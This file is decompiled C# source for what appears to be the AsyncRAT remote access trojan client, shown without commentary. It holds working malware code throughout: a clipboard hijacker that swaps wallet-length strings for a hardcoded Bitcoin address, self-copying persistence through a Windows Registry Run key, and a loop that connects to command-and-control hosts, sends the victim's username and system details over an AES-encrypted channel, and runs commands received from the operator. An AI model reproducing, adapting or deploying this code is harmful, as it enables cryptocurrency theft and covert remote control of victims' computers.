using System;
using System.Diagnostics;
using System.IO;
using System.Net.Sockets;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;

namespace AsyncRAT;

public class Program
{
	public static bool isConnected = false;

	public static Socket S = null;

	public static long BufferLength = 0L;

	public static readonly string BTC = "1LsLoq3MQku3CTu2dXrCFvFAyQYxY9kgbm";

	public static bool BufferLengthReceived = false;

	public static byte[] Buffer;

	public static MemoryStream MS = null;

	public static Timer Tick = null;

	public static ManualResetEvent allDone = new ManualResetEvent(initialState: false);

	[STAThread]
	public static void Main()
	{
		Thread thread = new Thread(ClipboardGrabber);
		thread.SetApartmentState(ApartmentState.STA);
		thread.Start();
		Install();
		while (true)
		{
			Thread.Sleep(2500);
			if (!isConnected)
			{
				isDisconnected();
				Connect();
			}
			allDone.WaitOne();
		}
	}

	public static void ClipboardGrabber()
	{
		while (true)
		{
			string text = Clipboard.GetText();
			if (text.Contains(BTC))
			{
				Thread.Sleep(2500);
			}
			if (Clipboard.GetText().Length >= 26 && Clipboard.GetText().Length <= 35)
			{
				Thread thread = new Thread(delegate(object a0)
				{
					Clipboard.SetText(Conversions.ToString(a0));
				});
				thread.SetApartmentState(ApartmentState.STA);
				thread.Start(BTC);
			}
			Thread.Sleep(1);
		}
	}

	public static void Install()
	{
		Thread.Sleep(2000);
		try
		{
			if (Operators.CompareString(Process.GetCurrentProcess().MainModule!.FileName, Settings.ClientFullPath, false) == 0)
			{
				return;
			}
			Process[] processes = Process.GetProcesses();
			foreach (Process process in processes)
			{
				try
				{
					if (Operators.CompareString(process.MainModule!.FileName, Settings.ClientFullPath, false) == 0)
					{
						process.Kill();
					}
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
			using (FileStream fileStream = new FileStream(Settings.ClientFullPath, FileMode.Create))
			{
				byte[] array = File.ReadAllBytes(Process.GetCurrentProcess().MainModule!.FileName);
				fileStream.Write(array, 0, array.Length);
			}
			Thread.Sleep(2000);
			Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run\\").SetValue(Path.GetFileName(Settings.ClientFullPath), Settings.ClientFullPath);
			Process.Start(Settings.ClientFullPath);
			Environment.Exit(0);
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	public static void Connect()
	{
		try
		{
			S = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
			BufferLength = 0L;
			Buffer = new byte[1];
			MS = new MemoryStream();
			S.ReceiveBufferSize = 50000;
			S.SendBufferSize = 50000;
			S.Connect(Settings.Hosts[new Random().Next(0, Settings.Hosts.Count)], Settings.Ports[new Random().Next(0, Settings.Ports.Count)]);
			isConnected = true;
			SendIdentification();
			S.BeginReceive(Buffer, 0, Buffer.Length, SocketFlags.None, BeginReceive, null);
			TimerCallback callback = delegate
			{
				Ping();
			};
			Tick = new Timer(callback, null, 15000, 30000);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			isConnected = false;
			ProjectData.ClearProjectError();
		}
		finally
		{
			allDone.Set();
		}
	}

	private static void SendIdentification()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		ComputerInfo val = new ComputerInfo();
		string text = val.get_OSFullName().Replace("Microsoft", null) + " " + Environment.Is64BitOperatingSystem.ToString().Replace("False", "32bit").Replace("True", "64bit") + " " + Environment.OSVersion.ServicePack.Replace("Service Pack", "SP");
		Send((byte)0, Helper.GetHash(Helper.ID()), Environment.UserName, text, Settings.VER);
	}

	public static void BeginReceive(IAsyncResult ar)
	{
		checked
		{
			if (isConnected && S.Connected)
			{
				try
				{
					int num = S.EndReceive(ar);
					if (num > 0)
					{
						if (!BufferLengthReceived)
						{
							if (Buffer[0] == 0)
							{
								BufferLength = Conversions.ToLong(Helper.BS(MS.ToArray()));
								MS.Dispose();
								MS = new MemoryStream();
								if (BufferLength != 0L)
								{
									Buffer = new byte[(int)(BufferLength - 1L) + 1];
									BufferLengthReceived = true;
								}
							}
							else
							{
								MS.WriteByte(Buffer[0]);
							}
						}
						else
						{
							MS.Write(Buffer, 0, num);
							if (MS.Length == BufferLength)
							{
								Buffer = new byte[1];
								BufferLength = 0L;
								ThreadPool.QueueUserWorkItem(delegate(object a0)
								{
									Messages.Read((byte[])a0);
								}, MS.ToArray());
								MS.Dispose();
								MS = new MemoryStream();
								BufferLengthReceived = false;
							}
							else
							{
								Buffer = new byte[(int)(BufferLength - MS.Length - 1L) + 1];
							}
						}
						S.BeginReceive(Buffer, 0, Buffer.Length, SocketFlags.None, BeginReceive, null);
					}
					else
					{
						isConnected = false;
					}
					return;
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					isConnected = false;
					ProjectData.ClearProjectError();
					return;
				}
			}
			isConnected = false;
		}
	}

	public static void Send(params object[] Msgs)
	{
		if (!isConnected && !S.Connected)
		{
			isConnected = false;
			return;
		}
		try
		{
			Pack pack = new Pack();
			byte[] input = pack.Serialize(Msgs);
			using MemoryStream memoryStream = new MemoryStream();
			byte[] array = Helper.AES_Encryptor(input);
			byte[] array2 = Helper.SB(Conversions.ToString(array.Length) + "\0");
			memoryStream.Write(array2, 0, array2.Length);
			memoryStream.Write(array, 0, array.Length);
			S.Poll(-1, SelectMode.SelectWrite);
			S.BeginSend(memoryStream.ToArray(), 0, checked((int)memoryStream.Length), SocketFlags.None, EndSend, null);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			isConnected = false;
			ProjectData.ClearProjectError();
		}
	}

	public static void EndSend(IAsyncResult ar)
	{
		try
		{
			S.EndSend(ar);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			isConnected = false;
			ProjectData.ClearProjectError();
		}
	}

	public static void isDisconnected()
	{
		if (Tick != null)
		{
			try
			{
				Tick.Dispose();
				Tick = null;
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
		if (MS != null)
		{
			try
			{
				MS.Close();
				MS.Dispose();
				MS = null;
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
			}
		}
		if (S != null)
		{
			try
			{
				S.Close();
				S.Dispose();
				S = null;
			}
			catch (Exception projectError3)
			{
				ProjectData.SetProjectError(projectError3);
				ProjectData.ClearProjectError();
			}
		}
	}

	public static void Ping()
	{
		try
		{
			if (isConnected)
			{
				Send((byte)9);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}
}
